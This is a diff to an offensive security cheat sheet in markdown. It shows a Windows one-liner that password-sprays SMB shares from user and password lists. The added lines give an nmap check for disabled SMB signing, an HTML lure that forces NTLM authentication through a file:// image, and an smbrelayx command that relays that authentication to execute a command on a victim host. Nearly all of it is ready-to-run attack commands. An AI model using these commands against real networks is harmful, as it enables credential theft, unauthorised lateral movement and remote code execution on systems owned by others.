@@ -236,3 +236,26 @@ Start spraying!
 ```
 C:\> @FOR /F %p in (pass.txt) DO @FOR /F %n in (users.txt) DO @net use \\SERVERIP\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
 ```
+
+## SMB Lateral Movement:
+
+Check if SMB signing is disabled on the endpoint:
+
+```
+nmap -p 445 <Victim IP> -sS --script smb-security-mode
+```
+
+Force authentication by crafting a HTML or file of your choice:
+
+```
+<html>
+    <h1>The Dietary Benefits of Eating Ben and Jerry's Phish Food</h1>
+    <img src="file://<Compromised Host>/download.jpg">
+</html>
+```
+
+Fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to victim2@10.0.0.6 and will attempt to execute a command ipconfigon the end host:
+
+```
+smbrelayx.py -h <Victim IP> -c "ipconfig"
+```
